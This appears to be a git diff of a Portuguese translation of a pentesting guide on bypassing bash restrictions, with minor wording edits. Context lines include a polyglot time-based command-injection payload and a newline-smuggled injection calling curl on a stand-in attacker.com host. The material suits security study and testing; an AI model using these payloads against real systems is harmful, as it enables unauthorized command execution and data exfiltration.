@@ -145,7 +145,7 @@ Você pode usar **burpcollab** ou [**pingb**](http://pingb.in) por exemplo.
 
 ### Builtins
 
-Caso você não consiga executar funções externas e tenha apenas acesso a um **conjunto limitado de builtins para obter RCE**, existem alguns truques úteis para fazê-lo. Normalmente, você **não poderá usar todos** os **builtins**, então você deve **conhecer todas as suas opções** para tentar contornar a prisão. Ideia de [**devploit**](https://twitter.com/devploit).\
+Caso você não consiga executar funções externas e tenha apenas acesso a um **conjunto limitado de builtins para obter RCE**, existem alguns truques úteis para fazer isso. Normalmente, você **não poderá usar todos** os **builtins**, então você deve **conhecer todas as suas opções** para tentar contornar a prisão. Ideia de [**devploit**](https://twitter.com/devploit).\
 Primeiro, verifique todos os [**builtins de shell**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Então aqui estão algumas **recomendações**:
 ```bash
 # Get list of builtins
@@ -203,7 +203,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Bypass potenciais regexes
+### Bypass potencial regexes
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
